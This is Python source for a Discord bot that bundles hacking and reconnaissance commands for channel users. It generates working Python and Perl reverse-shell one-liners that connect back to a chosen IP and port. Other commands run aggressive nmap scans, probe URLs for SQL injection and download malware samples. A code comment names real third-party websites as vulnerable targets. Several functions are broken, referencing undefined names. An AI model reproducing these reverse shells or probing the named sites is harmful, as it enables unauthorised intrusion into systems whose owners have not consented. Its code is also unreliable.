# [Weeke's] -> Discord Bot Source

import discord
import nmap
import subprocess
import dns.resolver
from dnsdumpster.DNSDumpsterAPI import DNSDumpsterAPI
import socket
import vulners
import base64
import ctypes
import requests
import time
import markdown
import censys
from bs4 import BeautifulSoup as BS
import virustotal3.core
import censys.certificates
import censys.data
import censys.ipv4
from github import Github
from pprint import pprint
from ipwhois import IPWhois
import shodan
import os
import sys
from discord.ext import commands

def weeke_system(cmd):
    subprocess.call(cmd, shell=True)

def restart_program():
    python = sys.executable
    os.execl(python, python, "\"{}\"".format(sys.argv[0]))

weeke_system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("[Weeke's]->Discord Bot")

token = ''
SHODAN_API_KEY = ''
API_URL = "https://censys.io/api/v1"
api_id = ""
api_secret = ""
GITHUB_ACCESS_TOKEN = ''
vulners_api_key = ""
vt_api = ''

# setup scanner
scanner = nmap.PortScanner()

bot = commands.Bot(command_prefix='.')


@bot.event
async def on_connect():
    print('[LOGS] Connecting to discord!')


@bot.event
async def on_ready():
    print('[LOGS] Bot is ready!')
    print('[LOGS] Logged in: {}'.format(bot.user.name))


@bot.event
async def on_resumed(ctx):
    print("\n[LOGS] Bot has resumed session!")
    await ctx.send('Bot has resumed session!')


@bot.command()
async def h(ctx):
    print(
        '\n[LOGS] Commands: \n .kick\n .ban\n .isUp\n .ping\n .purge\n .unBan\n .genShellPy\n .genShellPerl\n '
        '.getRefs\n .scanIp\n .whois\n .resolveCF\n .censysCertificates\n .censysRaw\n .censysData\n .censysIp\n '
        '.traceroute\n .nslookup\n .nmap\n .b64encode\n .b64decode\n .urlDecode\n .githubSearch\n .exploits\n '
        '.terminal\n .sqliTest\n .searchVT\n .vtSampleReport\n .vtSampleDownload\n .dnsDumpster')
    embed = discord.Embed(
        title="List of all commands that can be used",
        description="Command list",
        colour=discord.Colour.blue()
    )
    embed.set_footer(text="Help function")
    embed.set_author(name="Weeke")
    embed.add_field(name='.kick', value='Kick a member', inline=True)
    embed.add_field(name='.ban', value='Ban a member', inline=True)
    embed.add_field(name='.unBan', value='Unban a member', inline=True)
    embed.add_field(name='.isUp', value='Check if a host or ip is Up or Down', inline=False)
    embed.add_field(name='.ping', value='Get client latency', inline=True)
    embed.add_field(name='.purge', value='Purge chat (default is 2 lines)', inline=True)
    embed.add_field(name='.genShellPy', value='Generates a reverse shell in python', inline=True)
    embed.add_field(name='.genShellPerl', value='Generates a reverse shell in perl', inline=False)
    embed.add_field(name='.getRefs', value='Generates urls for censys.io and shodan.io', inline=True)
    embed.add_field(name='.scanIp', value='Scan ip or host using shodan.io API', inline=True)
    embed.add_field(name='.whois', value='Whois lookup on a host', inline=True)
    embed.add_field(name='.resolveCF', value='Resolves background ip of a host behind CF', inline=False)
    embed.add_field(name='.censysCertificates', value='Gets censys.io for certificates', inline=True)
    embed.add_field(name='.censysRaw', value='Gets raw out from censys.io', inline=True)
    embed.add_field(name='.censysData', value='Gets data from censys.io', inline=True)
    embed.add_field(name='.censysIp', value='Gets data from censys.io for IP', inline=False)
    embed.add_field(name='.traceroute', value='Runs traceroute on ip or host', inline=True)
    embed.add_field(name='.nslookup', value='Runs a nslookup on host', inline=True)
    embed.add_field(name='.nmap', value='Runs full nmap scan on an ip', inline=True)
    embed.add_field(name='.b64encode', value='Base64 encodes a string', inline=False)
    embed.add_field(name='.b64decode', value='Base64 decodes a string', inline=True)
    embed.add_field(name='.urlDecode', value='Does a url decode on string', inline=True)
    embed.add_field(name='.githubSearch', value='Searches github using a query', inline=True)
    embed.add_field(name='.exploits', value='Does a vulnDB exploit search with query', inline=False)
    embed.add_field(name='.terminal', value='Runs terminal commands(Clear, Restart, Stop)', inline=True)
    await ctx.send(embed=embed)

    embed2 = discord.Embed(
        title="List of all commands that can be used",
        description="Command list",
        colour=discord.Colour.blue()
    )
    embed2.set_footer(text="Help function")
    embed2.set_author(name="Weeke")
    embed2.add_field(name='.sqliTest', value='Test for basic SQL Injection vulnerabilities', inline=True)
    embed2.add_field(name='.searchVT', value='Search for hashes on virustotal', inline=True)
    embed2.add_field(name='.vtSampleReport', value='Creates a virustotal report for a given sample', inline=True)
    embed2.add_field(name='.vtSampleDownload', value="Downloads a given sample from virus total (I don't have an API key that can do this feature)", inline=False)
    embed2.add_field(name='.dnsDumpster', value='Use dnsDumpster unoficiall api', inline=True)
    await ctx.send(embed=embed2)


@bot.command()
async def ping(ctx):
    print('\n[LOGS] Running ping command!')
    await ctx.send(f'Client Latency: {round(bot.latency * 1000)}')


@bot.command()
async def purge(ctx, amount=2):
    print('\n[LOGS] Purging chat! (Default amount = 2)')
    await ctx.channel.purge(limit=amount)


@bot.command()
async def kick(ctx, member: discord.Member = None, *, reason=None):
    if member is None:
        print('\n[LOGS] Must enter a member to kick!')
        await ctx.send('Please enter a member to kick!')

    await member.kick(reason=reason)


@bot.command()
async def ban(ctx, member: discord.Member = None, *, reason=None):
    if member is None:
        print('\n[LOGS] Must enter a member to ban!')
        await ctx.send('Please enter a member to ban!')

    await member.ban(reason=reason)
    await ctx.send(f'Banned {member.mention}')


@bot.command()
async def unBan(ctx, *, member=None):
    if member is None:
        print('\n[LOGS] Please enter a member to unban!')
        await ctx.send('Please enter a member to unban!')

    # generating list of banned users
    banned_members = await ctx.guild.bans()
    member_name, member_disc = member.split('#')

    for ban_entry in banned_members:
        user = ban_entry.user

        if (user.name, user.disc) == (member_name, member_disc):
            print(f'\n[LOGS] Unbanning {user.mention}!')
            await ctx.guild.unban(user)
            await ctx.send(f'Unbanned {user.mention}!')


@bot.command()
async def isUp(ctx, ip_addr=None):
    print(f'\n[LOGS] Running isUp command on {ip_addr}!')

    if ip_addr is None:
        print('\n[LOGS] Must enter a ip!')
        ctx.send('Must enter a ip!')

    host = socket.gethostbyname(ip_addr)
    scanner.scan(host, '1', '-v')
    print("\n[LOGS] IP Status: ", scanner[host].state())
    await ctx.send(scanner[host].state())

    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Create a TCP/IP socket
    # rep = os.system('ping ' + ip_addr)
    # if rep == 0:
    #    print('IP Status: UP')
    # else:
    #    print('IP Status: DOWN')


@bot.command()
async def genShellPy(ctx, ip=None, port=None):
    pyBeginning = 'python -c '
    pyShell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((' + ip + ',' \
              + port + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([' \
                       '"/bin/sh","-i"]); '

    print(f'\n[LOGS] Generating reverse python shell on {ip} and {port}!')
    if ip is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Please enter a ip!')

    if port is None:
        print('\n[LOGS] Must enter a port!')
        await ctx.send('Please enter a port!')

    await ctx.send(pyBeginning + pyShell)


@bot.command()
async def genShellPerl(ctx, ip=None, port=None):
    perlBeginning = 'perl -e '
    perlShell = 'use Socket;$i=`' + ip + '`;$p=' + port + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(' \
                                                          'connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,' \
                                                          '">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh ' \
                                                          '-i");}; '

    print(f'\n[LOGS] Generating reverse perl shell on {ip} and {port}!')
    if ip is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Please enter a ip!')

    if port is None:
        print('\n[LOGS] Must enter a port!')
        await ctx.send('Please enter a port!')

    await ctx.send(perlBeginning + perlShell)


@bot.command()
async def getRefs(ctx, ip=None):
    print(f'\n[LOGS] Getting refs for {ip}!')
    if ip is None:
        print('\n[LOGS] Must enter a host or ip!')
        await ctx.send('Must enter a host or ip!')

    await ctx.send('https://censys.io/ipv4/' + ip)
    await ctx.send('https://www.shodan.io/host/' + ip)


@bot.command()
async def scanIp(ctx, ip=None):
    print(f'\n[LOGS] Running scan with shodan on {ip}!')
    # connecting api key
    api = shodan.Shodan(SHODAN_API_KEY)

    if ip is None:
        print('\n[LOGS] Must enter a host or ip!')
        await ctx.send('Must enter a host or ip!')

    s = socket.gethostbyname(ip)
    host = api.host(s)

    # Print general info
    print("""IP: {}\nOrganization: {}\nOperating System: {}\nReported: {}""".format(host['ip_str'],
                                                                                    host.get('org', 'n/a'),
                                                                                    host.get('os', 'n/a'),
                                                                                    host.get('reported', 'false')))
    await ctx.send("""IP: {}\nOrganization: {}\nOperating System: {}\nReported: {}""".format(host['ip_str'],
                                                                                             host.get('org', 'n/a'),
                                                                                             host.get('os', 'n/a'),
                                                                                             host.get('reported',
                                                                                                      'false')))

    # Print all banners
    for item in host['data']:
        print("""Port: {}""".format(item['port'], item['data']))
        await ctx.send("""Port: {}""".format(item['port'], item['data']))


@bot.command()
async def whois(ctx, ip=None):
    if ip is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Must enter a ip!')

    print(f'\n[LOGS] Running whois on {ip}')
    ip = socket.gethostbyname(ip)
    w = IPWhois(ip)
    res = w.lookup_whois(inc_nir=True)
    pprint(res)
    await ctx.send(res)

@bot.command()
async def censysCertificates(ctx, cert=None):
    print(f'\n[LOGS] Running censys search on {cert}!')
    if cert is None:
        print('\n[LOGS] Must enter a valid cert!')
        await ctx.send('Must enter a valid cert!')

    certificates = censys.certificates.CensysCertificates(api_id, api_secret)

    fields = ["parsed.subject_dn", "parsed.fingerprint_sha256"]
    for cert in certificates.search("validation.nss.valid: true", fields=fields):
        print(cert["parsed.subject_dn"])
        await ctx.send(cert["parsed.subject_dn"])

    # aggregate report on key types used by trusted certificates
    print(cert.report(query="valid_nss: true", field="parsed.subject_key_info.key_algorithm.name"))
    await ctx.send(cert.report(query="valid_nss: true", field="parsed.subject_key_info.key_algorithm.name"))


@bot.command()
async def censysRaw(ctx, name=None):
    print(f'\n[LOGS] Running censys raw search on {name}!')
    if name is None:
        print('\n[LOGS] Must enter a url!')
        await ctx.send('Must enter a url!')

    res = requests.get(API_URL + "/data", auth=(api_id, api_secret))
    if res.status_code != 200:
        print("\n[LOGS] error occurred: %s" % res.json()["error"])

    for name, series in res.json()["raw_series"].iteritems():
        print(series["name"], "was last updated at", series["latest_result"]["timestamp"])
        await ctx.send(series["name"], "was last updated at", series["latest_result"]["timestamp"])


@bot.command()
async def censysData(ctx, ip=None):
    print(f'\n[LOGS] Running censysData search on {ip}')
    if ip is None:
        print('\n[LOGS] Must enter a url!')
        await ctx.send('Must enter a url!')

    c = censys.data.CensysData(api_id, api_secret)
    url = socket.gethostbyname(ip)

    ssh_series = c.view_series(ip)

    for url in ssh_series['results']['historical']:
        print(c.view_result(ssh_series, url['id']))


@bot.command()
async def censysIp(ctx, ip=None):
    print(f'\n[LOGS] Running censysIp search on {ip}')
    if ip is None:
        print('\n[LOGS] Must enter a url or ip!')
        await ctx.send('Must enter a url or ip!')

    ip = socket.gethostbyname(ip)

    c = censys.ipv4.CensysIPv4(api_id, api_secret)
    c.report(""" "welcome to" AND tags.raw: "http" """, field="80.http.get.headers.server.raw", buckets=5)
    c.view(ip)

    IPV4_FIELDS = ['ip',
                   'updated_at',
                   '80.http.get.title',
                   '443.https.get.title']

    server_types = ['80.http.get.headers.server: Apache', '80.http.get.headers.server: IIS',
                    '80.http.get.headers.server: Nginx', '80.http.get.headers.server: LiteSpeed']
    data = list(
        c.search('80.http.get.headers.server: Nginx AND location.country: United States', IPV4_FIELDS, max_records=10))
    print(data)
    await ctx.send(data)


@bot.command()
async def traceroute(ctx, hostname=None):
    print(f'\n[LOGS] Running tracert on {hostname}')
    if hostname is None:
        print('\n[LOGS] Must enter a url or ip!')
        await ctx.send('Must enter a url or ip!')

    tracert = subprocess.run("tracert " + hostname)
    await ctx.send(tracert)


@bot.command()
async def nslookup(ctx, ip=None):
    print(f'\n[LOGS] Running nslookup on {ip}!')
    if ip is None:
        print('\n[LOGS] Must enter a url or ip!')
        await ctx.send('Must enter a url or ip!')

    dns_results = dns.resolver.query(ip, 'MX')
    for data in dns_results:
        print(data.exchange)
        await ctx.send(data.exchange)


@bot.command()
async def nmap(ctx, ip_addr=None):
    print(f'\n[LOGS] Running nmap on {ip_addr}!')
    if ip_addr is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Must enter a ip!')
       
    print("\n[LOGS] Nmap Version: ", scanner.nmap_version())
    await scanner.scan(ip_addr, '1-65535', '-v -sS -sV -sC -A -O')
    print("\n[LOGS] Ip Status: ", scanner[ip_addr].state())
    print(scanner[ip_addr].all_protocols())
    print("\n[LOGS] Open Ports: ", scanner[ip_addr]['tcp'].keys())
    await ctx.send(scanner[ip_addr]['tcp'].keys())


@bot.command()
async def b64encode(ctx, string):
    print(f'\n[LOGS] Running b64decode on {string}!')
    if string is None:
        print('\n[LOGS] Must enter a string!')
        await ctx.send('Must enter a string!')

    b = string.encode("ascii")
    c = base64.b64encode(b)
    d = c.decode("ascii")
    await ctx.send(d)


@bot.command()
async def b64decode(ctx, string):
    print(f'\n[LOGS] Running b64decode on {string}!')
    if string is None:
        print('\n[LOGS] Must enter a string!')
        await ctx.send('Must enter a string!')

    string_bytes = base64.b64decode(string)
    string = string_bytes.decode('ascii')
    await ctx.send(string)


@bot.command()
async def urlDecode(ctx, string):
    print(f'\n[LOGS] Running htmlDecode on {string}!')
    if string is None:
        print('\n[LOGS] Must enter a string!')
        await ctx.send('Must enter a string!')

    import urllib
    urllib.parse.quote_plus(string)
    await ctx.send(string)


@bot.command()
async def githubSearch(ctx, string=None):
    print(f'\n[LOGS] Searching github for {string}')

    # connecting github token for public_repo search
    git = Github(GITHUB_ACCESS_TOKEN)

    rate_limit = git.get_rate_limit()
    rate = rate_limit.search
    if rate.remaining == 0:
        print(f'You have 0/{rate.limit} API calls remaining. Reset time: {rate.reset}')
        return
    else:
        print(f'You have {rate.remaining}/{rate.limit} API calls remaining')

    query = f'"{string} english" in:readme+in:description'
    result = git.search_code(query, order='desc')

    max_size = 50
    print(f'Found {result.totalCount} file(s)')
    if result.totalCount > max_size:
        result = result[:max_size]

    for file in result:
        print(f'{file.download_url}')
        await ctx.send(f'{file.download_url}')


@bot.command()
async def exploits(ctx, string=None):
    print(f'\n[LOGS] Searching using vulners api for {string}')
    vulners_api = vulners.Vulners(vulners_api_key)
    exploit_search = vulners_api.searchExploit(string, limit=10)
    print(exploit_search)
    
    hrefs = [item['href'] for item in exploit_search]
    titles = [item['title'] for item in exploit_search]

    await ctx.send('```\n'  + '\n['.join(hrefs) + '\n' + '```')


@bot.command()
async def terminal(ctx, option=None, Clear=None, Restart=None, Stop=None):
    print('\n[LOGS] Running terminal commands!')
    if option is None:
        print('\n[LOGS] Must enter an option (Clear, Restart, Stop)')
        await ctx.send('Must enter an option (Clear, Restart, Stop)')
    elif option == 'clear':
        print('\n[LOGS] Running clear terminal')
        await ctx.send('Running clear terminal')
        weeke_system('cls')
        time.sleep(4)
        await ctx.send('Terminal Cleared!')
    elif option == 'restart':
        print('\n[LOGS] Running restart bot')
        await ctx.send('Running restart bot')
        await ctx.send("Bot Restarting In [5]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [4]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [3]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [2]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [1]")
        time.sleep(1)
        await ctx.send("Restarting Bot!")
        restart_program()
    elif option == 'stop':
        print('\n[LOGS] Running stop bot')
        await ctx.send('Running stop bot')
        print("\n[LOGS] Stopping Bot!")
        print("\n[LOGS] Bot Stopping In: [5]")
        await ctx.send('Bot Stopping In: [5]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [4]")
        await ctx.send('Bot Stopping In: [4]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [3]")
        await ctx.send('Bot Stopping In: [3]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [2]")
        await ctx.send('Bot Stopping In: [2]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [1]")
        await ctx.send('Bot Stopping In: [1]')
        time.sleep(1)
        print("\n[LOGS] Shutting Down Bot!")
        await ctx.send('Shutting Down Bot!')
        sys.exit()
    else:
        print('\n[LOGS] Invalid option!')
        await ctx.send('Invalid option!')


@bot.command()
async def sqliTest(ctx, url=None):
    global string

    print(f'\n[LOGS] Testing {url} for basic SQLI vulnerabilities')
    await ctx.send(f'Testing {url} for basic SQLI vulnerabilities')

    if url is None:
        print('\n[LOGS] Must input url to test')
        await ctx.send('Must input url to test')
    else:
        #####################################################################
        # EXAMPLES OF VULNERABLE SITES FOR TESTING                          #
        # https://www.architecturalpapers.ch/index.php?ID=4%27              #
        # http://www.wurm.info/index.php?id=8%27                            #
        # https://www.cityimmo.ch/reservations.php?lang=FR&todo=res&;id=22  #
        #####################################################################
        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()']

        test_url = url + "'"
        test_url2 = url + ';'

        results = requests.get(test_url)
        results2 = requests.get(test_url2)

        print(results)
        print(results2)

        data = results.text
        soup = BS(data, features="html.parser")

        data2 = results2.text
        soup2 = BS(data2, features="html.parser")

        for vuln in vulnerable_text:
            if vuln in data:
                string = vuln
                print('\n[LOGS] Vulnerable: ' + vuln)
                await ctx.send('Vulnerable: ' + vuln)

        for vuln in vulnerable_text:
            if vuln in data2:
                string = vuln
                print('\n[LOGS] Vulnerable: ' + vuln)
                await ctx.send('Vulnerable: ' + vuln)


@bot.command()
async def searchVT(ctx, query=None):
    print(f'\n[LOGS] Searching VirusTotal for {query}')

    if query is None:
        print('\n[LOGS] Must enter a query!')
        await ctx.send('Must enter a query!')

    data = {
        "apikey": vt_api,
        "query": query,
    }

    vt_request = requests.post(VT_SEARCH, data=data)

    hashes = []
    while len(hashes) < count:
        hashes.extend(vt_request.json()["hashes"])

        if "offset" not in vt_request.json():
            break

        data["offset"] = vt_request.json()["offset"]
        vt_request = requests.post(VT_SEARCH, data=data)


@bot.command()
async def vtSampleReport(ctx, sample_id):
    # test sample a0dbae122905501741e03499e28bea1f
    print(f'\n[LOGS] Getting report for sample using {sample_id}')
    url = 'https://www.virustotal.com/vtapi/v2/file/report'

    params = {'apikey': vt_api, 'resource': sample_id}
    response = requests.get(url, params=params)
    json_response = response.json()
    print(json_response)

    md5 = json_response["md5"]
    sha256 = json_response["sha256"]
    sha1 = json_response["sha1"]
    permalink = json_response["permalink"]
    scanners = json_response["scans"].keys()

    markdown = """
Scan Results
Link: {permalink}

MD5: {md5}
SHA256: {sha256}
SHA1: {sha1} 

|    Scanner    |   Detected    |   Result   |
|:-------------:|:-------------:|:----------:|
    """.format(permalink=permalink , md5=md5, sha256=sha256, sha1=sha1)

    for scanner in scanners:
        detected = json_response["scans"][scanner]
        result = json_response["scans"][scanner]["result"]
        markdown += """|{scanner}|{detected}|{result}|\n""".format(scanner=scanner, detected=detected, result=result)

    with open('sample.md', 'w') as file:
        file.write(markdown)

    file = discord.File("sample.md", filename="sample.md")
    await ctx.send("VirusTotal Sample Report", file=file)

"""
{
 'response_code': 1,
 'verbose_msg': 'Scan finished, scan information embedded in this object',
 'resource': '99017f6eebbac24f351415dd410d522d',
 'scan_id': '52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c-1273894724',
 'md5': '99017f6eebbac24f351415dd410d522d',
 'sha1': '4d1740485713a2ab3a4f5822a01f645fe8387f92',
 'sha256': '52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c',
 'scan_date': '2010-05-15 03:38:44',
 'permalink': 'https://www.virustotal.com/file/52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c/analysis/1273894724/',
 'positives': 40,
 'total': 40,
 'scans': {
   'nProtect': {
     'detected': true, 
     'version': '2010-05-14.01', 
     'result': 'Trojan.Generic.3611249', 
     'update': '20100514'
   },
   'CAT-QuickHeal': {
     'detected': true, 
     'version': '10.00', 
     'result': 'Trojan.VB.acgy', 
     'update': '20100514'
   },
   'McAfee': {
     'detected': true, 
     'version': '5.400.0.1158', 
     'result': 'Generic.dx!rkx', 
     'update': '20100515'
   },
   'TheHacker': {
     'detected': true, 
     'version': '6.5.2.0.280', 
     'result': 'Trojan/VB.gen', 
     'update': '20100514'
   },   
   'VirusBuster': {
    'detected': true,
     'version': '5.0.27.0',
     'result': 'Trojan.VB.JFDE',
     'update': '20100514'
   }
 }
}

'md5': '99017f6eebbac24f351415dd410d522d',
'sha1': '4d1740485713a2ab3a4f5822a01f645fe8387f92',
'sha256': '52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c',
'scan_date': '2010-05-15 03:38:44',
'permalink': 'https://www.virustotal.com/file/52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c/analysis/1273894724/',
'result': 'Trojan.Generic.3611249',
'scans': {
     'nProtect': {
     'CAT-QuickHeal': {
     'McAfee': {
     'TheHacker': {
     'VirusBuster': {
"""
    
def save_downloaded_file(filename, file_stream):
    """ Save Downloaded File to Disk Helper Function
    :param save_file_at: Path of where to save the file.
    :param file_stream: File stream
    :param filename: Name to save the file.
    """
    filename = os.path.join('\samples', filename)
    with open(filename, 'wb') as f:
        f.write(file_stream)
        f.flush()

@bot.command()
async def vtSampleDownload(ctx, sample_id):
    # test sample 7657fcb7d772448a6d8504e4b20168b8
    print(f'\n[LOGS] Downloading sample using {sample_id}')
    url = 'https://www.virustotal.com/vtapi/v2/file/download'
    params = {'apikey': vt_api, 'hash': sample_id}
    response = requests.get(url, params=params)
    downloaded_file = response.content
    print(response.status_code)
    file = discord.File(downloaded_file, filename=downloaded_file)
    await ctx.send("VirusTotal Sample", file=file)

def get_image(domain):
    url = 'https://dnsdumpster.com/'
    s = requests.Session()
    s.headers = {'Referer': url}
    r = s.get(url)
    soup = BS(r.content, 'html.parser')
    csrf_middleware = soup.findAll('input', attrs={'name': 'csrfmiddlewaretoken'})[0]['value']
    s.cookies.update({'csrftoken':csrf_middleware})
    d = {'csrfmiddlewaretoken': csrf_middleware, 'targetip': domain}
    s.post(url, data = d)
    pic = s.get('{}/static/map/{}.png'.format(url, domain), stream = True)
    print(pic.content[:20])
    with open('result.png', 'wb') as f: f.write(pic.content)

@bot.command()
async def dnsDumpster(ctx, domain):
    print(f'\n[LOGS] Using dnsDumpster on {domain}')
    res = DNSDumpsterAPI(True).search(domain)
    print("\n####### DNS Servers #######")
    await ctx.send("####### DNS Servers #######")
    for entry in res['dns_records']['dns']:
        print(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
        await ctx.send(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
    print("\n####### MX Records #######")
    await ctx.send("\n####### MX Records #######")
    for entry in res['dns_records']['mx']:
        print(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
        await ctx.send(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
    print("\n####### Host Records (A) #######")
    await ctx.send("\n####### Host Records (A) #######")
    for entry in res['dns_records']['host']:
        if entry['reverse_dns']:
            print(("{domain} ({reverse_dns}) ({ip}) {as} {provider} {country}".format(**entry)))
            await ctx.send(("{domain} ({reverse_dns}) ({ip}) {as} {provider} {country}".format(**entry)))
        else:
            print(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
            await ctx.send(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
    
    get_image(domain)

    file = discord.File("result.png", filename="result.png")
    await ctx.send("", file=file)

bot.run(token)
